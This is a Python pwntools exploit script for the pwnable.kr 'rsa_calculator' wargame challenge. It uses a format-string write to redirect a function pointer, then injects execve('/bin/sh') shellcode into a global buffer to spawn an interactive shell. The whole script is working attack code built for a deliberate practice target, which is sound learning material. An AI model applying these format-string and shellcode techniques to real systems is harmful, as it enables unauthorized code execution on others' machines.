from pwn import *
import sys
import time

# context
context.arch="amd64"
context.kernel="amd64"
context.os="linux"
context.log_level="debug"


# Binary specific settings
binary_name = "rsa_calculator"
REMOTE = "nc pwnable.kr 9012"

# Set up actual exploitatpn parameters
elf  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)
libc=elf.libc # So long as i'm not running against the remote target, use the local libc
context.binary = elf


def set_key(P, q, e, d,p):
    p.sendlineafter('> ', '1')
    p.sendlineafter('p : ', (P))
    p.sendlineafter('q : ', (q))
    p.sendlineafter('e : ', (e))
    p.sendlineafter('d : ', (d))

def encrypt(payload,p):
    p.sendlineafter('> ', '2')
    p.sendlineafter(': ', '1024')
    p.sendlineafter('data\n', payload)

def decrypt(payload,p):
    p.sendlineafter('> ', '3')
    p.sendlineafter(': ', '1024')
    p.sendlineafter('data\n', payload)

def main():
    if(len(sys.argv) <2):
        print("Running locally")
        p = process(f"./{binary_name}")
    else:
        if(sys.argv[1] == "remote"):
            ip, port = REMOTE.replace("nc ", "").split(" ")
            port = int(port)
            p = remote(ip, port)
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *RSA_encrypt", aslr=False)
        else:
            p = process(f"./{binary_name}")

        help_addr=0x602518

        set_key('10000', '10000', '1', '1',p) # e is 1, input stays the same 

        g_pbuf=0x602560 # used in the payload down here
        payload = '%6301024c%26$n'
        encrypt(payload,p)
        p.recvuntil('-\n')

        payload = p.recvline()[:-1]+p64(help_addr) # help now points to bss encrypt buffer
        decrypt(payload,p)

        shellcode = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05' # shellcode that will be written g_pbuf, and help points to g_pbuf
        encrypt(shellcode,p)

        p.sendlineafter('> ', '4')
        p.interactive()


main()


